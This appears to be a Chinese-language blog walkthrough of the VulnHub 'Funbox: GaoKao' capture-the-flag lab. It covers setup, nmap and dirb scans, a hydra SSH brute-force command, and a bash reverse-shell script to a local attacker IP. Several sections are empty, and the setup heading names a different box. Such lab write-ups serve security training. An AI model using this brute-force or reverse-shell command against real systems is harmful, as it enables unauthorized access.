# 原创
：  VulnHub渗透测试实战靶场 - Funbox: GaoKao

# VulnHub渗透测试实战靶场 - Funbox: GaoKao

#### VulnHub渗透测试实战靶场 - Funbox: GaoKao

## 题目描述

```
It's a box for beginners, but not easy. Gather careful !!!

Hint:

Don't waste your time ! Every BruteForce-Attack at all ports can be stopped after 1500 trys per account.

Enjoy the game and WYSIWYG !

This works better with VirtualBox rather than VMware

```

## 环境下载

> 



## Funbox: Lunchbreaker靶机搭建

> 

- 将下载好的靶机环境，导入 VritualBox，设置为 Host-Only 模式- 将 VMware 中桥接模式网卡设置为 VritualBox 的 Host-only


> 



## 渗透测试

### 信息搜集

> 
用 Nmap 扫描一下目标靶机的端口信息：`sudo nmap -sS -A -Pn 192.168.56.117`，发现开放了 `21、22、80、3306` 四个端口


> 
用 dirb 扫描一下 80 端口 web 目录：`dirb http://192.168.56.116`


### 漏洞挖掘

> 



> 



```
hydra -l sky -P rockyou.txt 192.168.56.117 ssh

```

> 



```
#!/bin/sh
bash -i &gt;&amp; /dev/tcp/192.168.56.102/1234 0&gt;&amp;1;

```

> 



### getshell

> 



### 提权

> 



> 


